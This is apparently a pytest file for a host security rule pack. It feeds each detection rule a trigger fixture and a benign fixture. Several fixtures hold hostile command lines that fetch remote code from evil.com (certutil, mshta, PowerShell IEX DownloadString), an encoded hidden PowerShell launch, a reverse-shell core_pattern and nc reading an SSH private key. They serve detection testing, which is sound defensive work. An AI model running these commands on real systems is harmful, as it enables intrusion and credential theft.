"""
tests/unit/test_detection_rules_verification.py

Verification harness for all detection rules.

For every rule registered in _RULE_EVALUATORS this test runs a crafted trigger
fixture and asserts the evaluator fires (returns non-None).  Rules that are
prose-only (no evaluator yet) are enumerated and reported but don't block CI.

Run with:   pytest tests/unit/test_detection_rules_verification.py -v
Coverage report is printed by the session-finish hook at the bottom.
"""
from __future__ import annotations

import asyncio
import json

import pytest

from manager.manager.attacklens.rulepack import _RULE_EVALUATORS, RulePackDetector

# ── helpers ───────────────────────────────────────────────────────────────────

def _run(coro):
    return asyncio.run(coro)


class _MockFeeds:
    """Minimal stand-in for FeedManager when a live feed check is needed."""
    def is_malicious_ip(self, ip: str) -> bool:
        return ip == "185.220.101.1"


# ── per-rule trigger fixtures ─────────────────────────────────────────────────
# Each entry: rule_id -> (section, payload, env_overrides)
# env_overrides is a dict of env vars needed to make the rule fire.

TRIGGER_FIXTURES: dict[str, tuple[str, list[dict] | dict, dict[str, str]]] = {
    # ── Agent health ─────────────────────────────────────────────────────────
    "AGENT-HEALTH-003": (
        "agent_health",
        [{"restart_count": 5, "sha256": "deadbeef00000000000000000000000000000000000000000000000000000000"}],
        {"ATTACKLENS_KNOWN_GOOD_AGENT_HASHES": "aabbcc"},  # deadbeef not in known set → fires
    ),
    "AGENT-HEALTH-004": (
        "agent_health",
        [{"clock_skew_seconds": 400}],
        {},
    ),

    # ── Apps ─────────────────────────────────────────────────────────────────
    "APPS-002": (
        "apps",
        [{"name": "BadApp", "install_path": "/Applications/BadApp.app", "code_signature_valid": False}],
        {},
    ),
    "APPS-003": (
        "apps",
        [{"name": "ShadowApp", "install_path": "/tmp/ShadowApp.app"}],
        {},
    ),

    # ── Binaries ─────────────────────────────────────────────────────────────
    "BINARIES-001": (
        "binaries",
        [{"name": "evil", "path": "/usr/local/bin/evil", "signature_valid": False}],
        {},
    ),
    "BINARIES-002": (
        "binaries",
        [{"name": "evil2", "path": "/tmp/evil2", "malware_hash_hit": True}],
        {},
    ),
    "BINARIES-003": (
        "binaries",
        [{"name": "drop", "path": "/tmp/dropper"}],
        {},
    ),
    "BINARIES-004": (
        "binaries",
        [{"name": "certutil", "path": "/Windows/System32/certutil.exe",
          "command_line": "certutil -urlcache -split -f http://evil.com/x.exe"}],
        {},
    ),
    "BINARIES-005": (
        "binaries",
        [{"name": "packed", "path": "/tmp/packed",
          "shannon_entropy": 7.5, "signature_valid": False}],
        {},
    ),
    "BINARIES-006": (
        "binaries",
        [{"name": "svchost.exe", "path": "/tmp/svchost.exe"}],  # wrong path for svchost
        {},
    ),

    # ── Configs ──────────────────────────────────────────────────────────────
    "CONFIGS-003": (
        "configs",
        {"/etc/app.conf": "api_key = sk-live-abcdefghij1234567890"},
        {},
    ),
    "CONFIGS-004": (
        "configs",
        [{"path": "/etc/shadow", "world_writable": True}],
        {},
    ),

    # ── Connections ──────────────────────────────────────────────────────────
    "CONNECTIONS-002": (
        "connections",
        [{"remote_addr": "185.220.101.1:443", "process": "curl", "malicious_ip": True}],
        {},
    ),
    "CONNECTIONS-006": (
        "connections",
        [{"fingerprinted_protocol": "http", "dest_port": 4444, "remote_addr": "1.2.3.4:4444"}],
        {},
    ),

    # ── Containers ───────────────────────────────────────────────────────────
    "CONTAINERS-001": (
        "containers",
        [{"id": "abc123", "image": "ubuntu:latest", "privileged": True}],
        {},
    ),
    "CONTAINERS-002": (
        "containers",
        [{"id": "abc124", "image": "ubuntu:latest",
          "mounts": [{"source": "/var/run/docker.sock", "target": "/docker.sock"}]}],
        {},
    ),
    "CONTAINERS-003": (
        "containers",
        [{"id": "abc125", "image": "evil.registry.io/app:latest", "registry_hostname": "evil.registry.io"}],
        {"ATTACKLENS_APPROVED_REGISTRIES": "registry.company.com"},
    ),
    "CONTAINERS-004": (
        "containers",
        [{"id": "abc126", "host_pid_namespace": True}],
        {},
    ),
    "CONTAINERS-005": (
        "containers",
        [{"id": "abc127", "process_uid": 0}],
        {},
    ),

    # ── Hardware ─────────────────────────────────────────────────────────────
    "HARDWARE-001": (
        "hardware",
        [{"bus": "usb", "name": "SanDisk Ultra USB Flash Drive",
          "vendor_id": "0x0781", "product_id": "0x5581", "serial": "A1B2C3D4"}],
        {"ATTACKLENS_APPROVED_USB_IDS": "0x1234:0xabcd:OTHER"},  # not in approved list
    ),
    "HARDWARE-004": (
        "hardware",
        [{"secure_boot_enabled": False, "previous_state": True}],
        {},
    ),

    # ── Mounts ───────────────────────────────────────────────────────────────
    "MOUNTS-001": (
        "mounts",
        [{"device_type": "removable", "host_policy_class": "removable_restricted",
          "device": "disk9s1"}],
        {},
    ),
    "MOUNTS-002": (
        "mounts",
        [{"mount_type": "nfs", "remote_host": "suspicious.nfs.server", "device": "suspicious.nfs.server:/share"}],
        {"ATTACKLENS_APPROVED_FILE_SERVERS": "trusted.nfs.corp"},
    ),
    "MOUNTS-003": (
        "mounts",
        [{"mount_point": "/etc", "mount_options": "rw,o+w"}],
        {},
    ),

    # ── Network ──────────────────────────────────────────────────────────────
    "NETWORK-001": (
        "network",
        [{"ssid": "CorpWifi", "bssid": "aa:bb:cc:dd:ee:ff"}],
        {"ATTACKLENS_CORPORATE_SSIDS": "corpwifi", "ATTACKLENS_APPROVED_AP_BSSIDS": "11:22:33:44:55:66"},
    ),
    "NETWORK-002": (
        "network",
        [{"promiscuous_mode": True, "host_role": "workstation"}],
        {},
    ),
    "NETWORK-003": (
        "network",
        [{"current_gateway": "10.0.0.99"}],
        {"ATTACKLENS_APPROVED_GATEWAYS": "10.0.0.1"},
    ),
    "NETWORK-004": (
        "network",
        [{"domain_registration_age_days": 2, "domain": "brand-new-phish.com"}],
        {},
    ),

    # ── Open files ───────────────────────────────────────────────────────────
    "OPEN_FILES-001": (
        "openfiles",
        [{"pid": 999, "process": "nc", "file_path": "/Users/alice/.ssh/id_rsa"}],
        {},
    ),

    # ── Packages ─────────────────────────────────────────────────────────────
    "PACKAGES-001": (
        "packages",
        [{"package_name": "evil-lib", "source_repo": "pypi.evil.io"}],
        {"ATTACKLENS_APPROVED_REPOS": "pypi.org"},
    ),
    "PACKAGES-003": (
        "packages",
        [{"package_name": "openssl", "installed_hash": "deadbeef", "registry_hash": "cafebabe"}],
        {},
    ),
    "PACKAGES-005": (
        "packages",
        [{"package_name": "crowdstrike", "removal_event": True}],
        {},
    ),

    # ── Ports ────────────────────────────────────────────────────────────────
    "PORTS-003": (
        "ports",
        [{"listening_port": 443, "owning_process_path": "/tmp/fakeweb"}],
        {"ATTACKLENS_APPROVED_BINARY_FOR_PORT": json.dumps({"443": "/usr/sbin/nginx"})},
    ),

    # ── Processes ────────────────────────────────────────────────────────────
    "PROCESSES-001": (
        "processes",
        [{"parent_process_name": "winword.exe", "child_process_name": "powershell.exe"}],
        {},
    ),
    "PROCESSES-002": (
        "processes",
        [{"name": "powershell.exe",
          "command_line": "powershell.exe -nop -w hidden -enc " + "A" * 80}],
        {},
    ),
    "PROCESSES-003": (
        "processes",
        [{"name": "unknown.exe", "remote_memory_allocation": True, "remote_thread_created": True}],
        {},
    ),
    "PROCESSES-004": (
        "processes",
        [{"name": "dropper", "path": "/tmp/dropper"}],
        {},
    ),
    "PROCESSES-006": (
        "processes",
        [{"name": "mshta",
          "command_line": "mshta.exe javascript:GetObject('script:http://evil.com/x.sct')"}],
        {},
    ),

    # ── SBOM ─────────────────────────────────────────────────────────────────
    "SBOM-002": (
        "sbom",
        [{"component_name": "somelib", "provenance_attestation_present": False}],
        {},
    ),
    "SBOM-004": (
        "sbom",
        [{"component_name": "gpl-lib", "component_license": "gpl-3.0", "build_target": "production"}],
        {},
    ),

    # ── Security posture ─────────────────────────────────────────────────────
    "SECURITY-001": (
        "security",
        [{"security_agent_service_state": "stopped"}],
        {},
    ),
    "SECURITY-002": (
        "security",
        [{"event_type": "log_cleared", "log_channel": "security"}],
        {},
    ),
    "SECURITY-003": (
        "security",
        [{"rule_action": "allow", "rule_direction": "inbound", "source_cidr": "0.0.0.0/0"}],
        {},
    ),
    "SECURITY-004": (
        "security",
        [{"vulnerability_severity": "critical", "days_since_disclosure": 45,
          "sla_days": 30, "patch_available": True}],
        {},
    ),
    "SECURITY-005": (
        "security",
        [{"account_privilege_level": "admin", "mfa_enforced_old": True, "mfa_enforced": False}],
        {},
    ),

    # ── Services ─────────────────────────────────────────────────────────────
    "SERVICES-001": (
        "services",
        [{"service_name": "EvilSvc", "service_create_event": True,
          "signature_valid": False, "path": "/tmp/evild"}],
        {},
    ),
    "SERVICES-002": (
        "services",
        [{"service_name": "crowdstrike-falcon-sensor", "new_state": "stopped"}],
        {},
    ),
    "SERVICES-004": (
        "services",
        [{"service_name": "NewSvc", "run_as_account": "system",
          "signature_valid": False, "path": "/tmp/newsvc"}],
        {},
    ),
    "SERVICES-005": (
        "services",
        [{"service_name": "HiddenSvc", "start_type_new": "automatic", "start_type_old": "disabled"}],
        {},
    ),

    # ── Storage ──────────────────────────────────────────────────────────────
    "STORAGE-003": (
        "storage",
        [{"volume": "disk1", "key_identifier_changed": True}],
        {},
    ),
    "STORAGE-004": (
        "storage",
        [{"volume": "disk2", "quota_usage_pct": 95,
          "top_writing_process": {"first_seen": 1.0}}],
        {},
    ),
    "STORAGE-005": (
        "storage",
        [{"device": "disk9", "filesystem_type": "unknown", "partition_size_gb": 2.5}],
        {},
    ),

    # ── Sysctl ───────────────────────────────────────────────────────────────
    "SYSCTL-001": (
        "sysctl",
        [{"net.ipv4.ip_forward": 1, "host_role": "workstation"}],
        {},
    ),
    "SYSCTL-003": (
        "sysctl",
        [{"core_pattern": "|/usr/sbin/reverse_shell %p"}],
        {},
    ),
    "SYSCTL-005": (
        "sysctl",
        [{"sysctl_key": "kernel.yama.ptrace_scope",
          "current_ptrace_scope": 0, "baseline_ptrace_scope": 2}],
        {},
    ),

    # ── Scheduled tasks ──────────────────────────────────────────────────────
    "TASKS-001": (
        "tasks",
        [{"task_name": "EvilTask", "task_create_event": True,
          "target_signature_valid": False, "path": "/tmp/evil"}],
        {},
    ),
    "TASKS-002": (
        "tasks",
        [{"task_name": "RootTask", "run_as_account": "root",
          "target_signature_valid": False, "path": "/tmp/rootd"}],
        {},
    ),
    "TASKS-003": (
        "tasks",
        [{"task_name": "Hidden", "task_state_new": "enabled", "task_state_old": "disabled"}],
        {},
    ),
    "TASKS-004": (
        "tasks",
        [{"task_name": "LogonBaddy", "trigger_type": "on_logon", "path": "/tmp/logond"}],
        {},
    ),
    "TASKS-005": (
        "tasks",
        [{"task_name": "CronMod", "cron_entry_modified": True,
          "new_command": "bash -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://evil.com\")'"}],
        {},
    ),

    # ── Users ────────────────────────────────────────────────────────────────
    "USERS-001": (
        "users",
        [{"account_name": "hacker", "account_create_event": True, "account_type": "local"}],
        {},
    ),
    "USERS-002": (
        "users",
        [{"account_name": "baduser", "group_name": "sudo", "membership_add_event": True}],
        {},
    ),
    "USERS-003": (
        "users",
        [{"account_name": "dormant", "days_since_last_login": 120, "login_success": True}],
        {},
    ),
    "USERS-005": (
        "users",
        [{"account_name": "admin2",
          "password_never_expires_old": False, "password_never_expires": True}],
        {},
    ),
    "USERS-006": (
        "users",
        [{"account_name": "svc_deploy", "account_type": "service_account", "logon_type": "interactive"}],
        {},
    ),

    # ── Newly implemented evaluators (stable declarative-only gap) ─────────────
    "AGENT-HEALTH-002": (
        "agent_health",
        [{"agent_version": "1.2.0", "previous_version": "1.5.3"}],
        {},
    ),
    "AGENT-HEALTH-005": (
        "agent_health",
        [{"config_hash": "newhash", "baseline_config_hash": "basehash"}],
        {},
    ),
    "APPS-001": (
        "apps",
        [{"name": "CryptoMiner", "app_id": "com.evil.miner"}],
        {"ATTACKLENS_APPROVED_APPS": "safari"},  # Safari (benign) is approved; miner is not
    ),
    "APPS-005": (
        "apps",
        [{"name": "Trojan", "malware_hash_hit": True}],
        {},
    ),
    "ARP-003": (
        "arp",
        [{"ip": "10.0.0.1", "is_default_gateway": True, "mac": "de:ad:be:ef:00:99",
          "baseline_gateway_mac": "11:22:33:44:55:66"}],
        {},
    ),
    "ARP-005": (
        "arp",
        [{"mac": "de:ad:be:00:11:22", "oui": "de:ad:be", "segment_class": "restricted"}],
        {"ATTACKLENS_APPROVED_OUIS": "11:22:33"},
    ),
    "BATTERY-002": (
        "battery",
        [{"battery_serial": "NEWCELL", "previous_serial": "OLDCELL", "cycle_count": 10}],
        {},
    ),
    "CONFIGS-001": (
        "configs",
        [{"config_key": "firewall", "old_value": "enabled", "new_value": "disabled"}],
        {},
    ),
    "CONFIGS-002": (
        "configs",
        [{"config_file": "/etc/ssh/sshd_config", "hash_changed": True}],
        {},
    ),
    "CONNECTIONS-005": (
        "connections",
        [{"remote_addr": "185.220.101.1:443", "tor_exit_node": True}],
        {},
    ),
    "HARDWARE-003": (
        "hardware",
        [{"component": "nic", "component_serial": "NEWSERIAL", "previous_component_serial": "OLDSERIAL"}],
        {},
    ),
    "HARDWARE-005": (
        "hardware",
        [{"vendor_id": "0x9999", "host_policy_class": "restricted"}],
        {"ATTACKLENS_APPROVED_USB_VENDORS": "0x1234"},
    ),
    "PACKAGES-002": (
        "packages",
        [{"package_name": "openssl", "version": "1.0.2", "previous_version": "3.0.7",
          "cve_ids": ["CVE-2016-2107"]}],
        {},
    ),
    "PACKAGES-004": (
        "packages",
        [{"package_name": "log4j", "version": "2.14.1", "cve_ids": ["CVE-2021-44228"], "kev_hit": True}],
        {},
    ),
    "PORTS-001": (
        "ports",
        [{"listening_port": 31337}],
        {"ATTACKLENS_BASELINE_LISTENING_PORTS": "443,22,80"},
    ),
    "SBOM-001": (
        "sbom",
        [{"component_name": "openssl", "cve_id": "CVE-2022-3602", "kev_hit": True}],
        {},
    ),
    "SBOM-005": (
        "sbom",
        [{"component_name": "python2", "is_eol": True}],
        {},
    ),
    "SERVICES-003": (
        "services",
        [{"service_name": "cups", "binary_path": "/tmp/evilcups", "previous_binary_path": "/usr/sbin/cups"}],
        {},
    ),
    "STORAGE-002": (
        "storage",
        [{"volume_id": "disk99", "new_volume": True}],
        {},
    ),
    "SYSCTL-002": (
        "sysctl",
        [{"sysctl_key": "kernel.randomize_va_space", "current_value": 0, "baseline_value": 2}],
        {},
    ),
}


# One representative normal record for every section with executable rule-pack
# logic. Each record deliberately sits on the benign side of all thresholds and
# allowlists used by that section. The negative test below runs it once per rule
# so every evaluator has explicit positive AND negative evidence.
BENIGN_SECTION_FIXTURES: dict[str, list[dict] | dict] = {
    "agent_health": [{
        "restart_count": 0,
        "sha256": "aabbcc",
        "clock_skew_seconds": 0,
    }],
    "apps": [{
        "name": "Safari",
        "install_path": "/Applications/Safari.app",
        "code_signature_valid": True,
    }],
    "binaries": [{
        "name": "ls",
        "path": "/usr/bin/ls",
        "signature_valid": True,
        "malware_hash_hit": False,
        "shannon_entropy": 4.0,
        "command_line": "ls -la",
    }],
    "configs": [{
        "path": "/etc/example.conf",
        "content": "feature_enabled=true",
        "permission_mode": "0644",
        "world_writable": False,
    }],
    "connections": [{
        "remote_addr": "10.0.0.10:443",
        "fingerprinted_protocol": "tls",
        "dest_port": 443,
        "malicious_ip": False,
    }],
    "containers": [{
        "id": "approved-container",
        "image": "registry.company.com/app:1.0.0",
        "registry_hostname": "registry.company.com",
        "privileged": False,
        "mounts": [],
        "host_pid_namespace": False,
        "process_uid": 1000,
    }],
    "hardware": [{
        "bus": "usb",
        "name": "Standard Keyboard",
        "vendor_id": "0x1234",
        "product_id": "0xabcd",
        "serial": "OTHER",
        "secure_boot_enabled": True,
        "previous_state": True,
    }],
    "mounts": [{
        "device_type": "fixed",
        "host_policy_class": "standard",
        "mount_type": "apfs",
        "mount_point": "/Users",
        "mount_options": "rw,nosuid",
        "world_writable": False,
    }],
    "network": [{
        "ssid": "CorpWifi",
        "bssid": "11:22:33:44:55:66",
        "promiscuous_mode": False,
        "host_role": "workstation",
        "current_gateway": "10.0.0.1",
        "domain": "example.com",
        "domain_registration_age_days": 365,
        "domain_name_entropy": 2.0,
    }],
    "openfiles": [{
        "pid": 100,
        "process": "tail",
        "file_path": "/var/log/system.log",
    }],
    "packages": [{
        "package_name": "requests",
        "source_repo": "pypi.org",
        "installed_hash": "aabbcc",
        "registry_hash": "aabbcc",
        "removal_event": False,
    }],
    "ports": [{
        "listening_port": 443,
        "owning_process_path": "/usr/sbin/nginx",
    }],
    "processes": [{
        "name": "Safari",
        "parent_process_name": "launchd",
        "child_process_name": "Safari",
        "command_line": "/Applications/Safari.app/Contents/MacOS/Safari",
        "path": "/Applications/Safari.app/Contents/MacOS/Safari",
        "remote_memory_allocation": False,
        "remote_thread_created": False,
    }],
    "sbom": [{
        "component_name": "approved-lib",
        "component_license": "mit",
        "build_target": "development",
        "provenance_attestation_present": True,
    }],
    "security": [{
        "security_agent_service_state": "running",
        "event_type": "policy_checked",
        "log_channel": "security",
        "rule_action": "deny",
        "rule_direction": "inbound",
        "source_cidr": "10.0.0.0/24",
        "vulnerability_severity": "medium",
        "days_since_disclosure": 1,
        "sla_days": 30,
        "patch_available": True,
        "account_privilege_level": "user",
        "mfa_enforced_old": True,
        "mfa_enforced": True,
    }],
    "services": [{
        "service_name": "approved-service",
        "service_create_event": False,
        "signature_valid": True,
        "path": "/usr/sbin/approved-service",
        "new_state": "running",
        "run_as_account": "service-user",
        "target_first_seen_days": 100,
        "start_type_new": "manual",
        "start_type_old": "manual",
    }],
    "storage": [{
        "volume": "disk1",
        "encryption_status_new": "encrypted",
        "encryption_status_old": "encrypted",
        "key_identifier_changed": False,
        "quota_usage_pct": 20,
        "top_writing_process": {"first_seen": 100},
        "filesystem_type": "apfs",
        "partition_size_gb": 500,
        "gpt_hidden_attribute": False,
    }],
    "sysctl": [{
        "sysctl_key": "kernel.yama.ptrace_scope",
        "current_value": 2,
        "current_ptrace_scope": 2,
        "baseline_ptrace_scope": 2,
        "host_role": "workstation",
        "core_pattern": "/cores/core.%P",
    }],
    "tasks": [{
        "task_name": "approved-task",
        "task_create_event": False,
        "target_signature_valid": True,
        "path": "/usr/bin/approved-task",
        "run_as_account": "service-user",
        "target_first_seen_days": 100,
        "task_state_new": "enabled",
        "task_state_old": "enabled",
        "trigger_type": "daily",
        "cron_entry_modified": False,
        "new_command": "/usr/bin/approved-task",
    }],
    "users": [{
        "account_name": "alice",
        "account_create_event": False,
        "account_type": "local",
        "group_name": "staff",
        "membership_add_event": False,
        "days_since_last_login": 1,
        "login_success": True,
        "password_never_expires_old": False,
        "password_never_expires": False,
        "complexity_required_old": True,
        "complexity_required": True,
        "logon_type": "console",
    }],
    "arp": [{
        "ip": "10.0.0.1",
        "mac": "11:22:33:44:55:66",
        "is_default_gateway": True,
        "baseline_gateway_mac": "11:22:33:44:55:66",
        "oui": "11:22:33",
        "segment_class": "restricted",
    }],
    "battery": [{
        "battery_serial": "BAT123",
        "previous_serial": "BAT123",
        "cycle_count": 150,
        "previous_cycle_count": 150,
    }],
}

# ── Rule inventory ────────────────────────────────────────────────────────────

@pytest.fixture(scope="session")
def detector():
    return RulePackDetector.load()


@pytest.fixture(scope="session")
def all_yaml_rule_ids(detector) -> set[str]:
    ids: set[str] = set()
    for section_rules in detector._rules.values():
        for r in section_rules:
            ids.add(r.id)
    return ids


# ── Coverage report collected during session ──────────────────────────────────

_report: dict[str, str] = {}  # rule_id -> "fired" | "no_fire" | "error" | "prose"
_negative_report: dict[str, str] = {}  # rule_id -> "silent" | "false_positive" | "error"


# ── Parametrised tests for every registered evaluator ────────────────────────

@pytest.mark.parametrize("rule_id", sorted(TRIGGER_FIXTURES))
def test_evaluator_fires_with_trigger_fixture(rule_id, monkeypatch):
    """Each evaluator must return a non-None match when given its trigger fixture."""
    section, payload, env_overrides = TRIGGER_FIXTURES[rule_id]
    for k, v in env_overrides.items():
        monkeypatch.setenv(k, v)

    # Fresh detector loads after env is patched so env-dependent sets are populated
    det = RulePackDetector.load()
    feeds = _MockFeeds() if rule_id == "CONNECTIONS-002" else None

    try:
        findings = _run(det.analyze("agent-test", section, payload, feeds))
    except Exception as exc:
        _report[rule_id] = f"error: {exc}"
        pytest.fail(f"{rule_id}: evaluator raised {type(exc).__name__}: {exc}")

    matched = [f for f in findings if f.get("rule_id") == f"rulepack:{rule_id}"]

    if not matched:
        _report[rule_id] = "no_fire"
        pytest.fail(
            f"{rule_id}: evaluator did not fire.\n"
            f"  section={section!r}, payload={payload!r}\n"
            f"  findings returned: {[f.get('rule_id') for f in findings]}"
        )

    _report[rule_id] = "fired"
    finding = matched[0]
    # Basic contract checks
    assert finding.get("severity"), f"{rule_id}: finding missing severity"
    assert finding.get("category"), f"{rule_id}: finding missing category"
    assert "evidence" in finding, f"{rule_id}: finding missing evidence"


@pytest.mark.parametrize("rule_id", sorted(TRIGGER_FIXTURES))
def test_evaluator_stays_silent_with_benign_fixture(rule_id, monkeypatch):
    """Every executable rule must stay silent for representative normal data."""
    section, _, env_overrides = TRIGGER_FIXTURES[rule_id]
    for key, value in env_overrides.items():
        monkeypatch.setenv(key, value)

    det = RulePackDetector.load()
    feeds = _MockFeeds() if rule_id == "CONNECTIONS-002" else None
    payload = BENIGN_SECTION_FIXTURES[section]
    try:
        findings = _run(det.analyze("agent-test", section, payload, feeds))
    except Exception as exc:
        _negative_report[rule_id] = f"error: {exc}"
        pytest.fail(f"{rule_id}: benign fixture raised {type(exc).__name__}: {exc}")

    matched = [f for f in findings if f.get("rule_id") == f"rulepack:{rule_id}"]
    if matched:
        _negative_report[rule_id] = "false_positive"
        pytest.fail(f"{rule_id}: fired for benign {section} fixture: {matched}")
    _negative_report[rule_id] = "silent"


def test_prose_rules_enumerated(all_yaml_rule_ids):
    """All YAML rules without evaluators are identified and counted."""
    prose = sorted(all_yaml_rule_ids - set(_RULE_EVALUATORS))
    for r in prose:
        _report[r] = "prose"
    # Not a failure — prose rules are expected; we just want visibility
    print(f"\nProse-only rules (no evaluator yet): {len(prose)}")
    for r in prose:
        print(f"  {r}")


def test_evaluators_have_fixtures():
    """Every registered evaluator should have a trigger fixture in this file."""
    missing = sorted(set(_RULE_EVALUATORS) - set(TRIGGER_FIXTURES))
    assert not missing, (
        "The following evaluators have no trigger fixture:\n"
        + "\n".join(f"  {r}" for r in missing)
    )


def test_evaluator_sections_have_benign_fixtures():
    missing = sorted(
        {section for section, _, _ in TRIGGER_FIXTURES.values()}
        - set(BENIGN_SECTION_FIXTURES)
    )
    assert not missing, "Sections without benign fixtures: " + ", ".join(missing)


# ── Coverage report (printed after all tests) ─────────────────────────────────

def pytest_terminal_summary(terminalreporter, exitstatus, config):
    fired  = [r for r, s in _report.items() if s == "fired"]
    prose  = [r for r, s in _report.items() if s == "prose"]
    errors = {r: s for r, s in _report.items() if s.startswith("error")}
    no_fire = [r for r, s in _report.items() if s == "no_fire"]
    silent = [r for r, s in _negative_report.items() if s == "silent"]
    false_positives = [
        r for r, s in _negative_report.items() if s == "false_positive"
    ]
    negative_errors = {
        r: s for r, s in _negative_report.items() if s.startswith("error")
    }

    terminalreporter.write_sep("=", "Detection Rule Coverage Report")
    terminalreporter.write_line(f"  Fired (evaluator verified):  {len(fired)}")
    terminalreporter.write_line(f"  Prose-only (no evaluator):   {len(prose)}")
    terminalreporter.write_line(f"  Did not fire (bad fixture?): {len(no_fire)}")
    terminalreporter.write_line(f"  Errors:                      {len(errors)}")
    terminalreporter.write_line(f"  Benign fixture silent:       {len(silent)}")
    terminalreporter.write_line(f"  Benign false positives:      {len(false_positives)}")
    terminalreporter.write_line(f"  Benign fixture errors:       {len(negative_errors)}")
    if errors:
        for r, s in errors.items():
            terminalreporter.write_line(f"    {r}: {s}")
    terminalreporter.write_line(
        f"  Total rules evaluated: {len(_report)} "
        f"(of {len(_RULE_EVALUATORS)} evaluators + {len(prose)} prose)"
    )
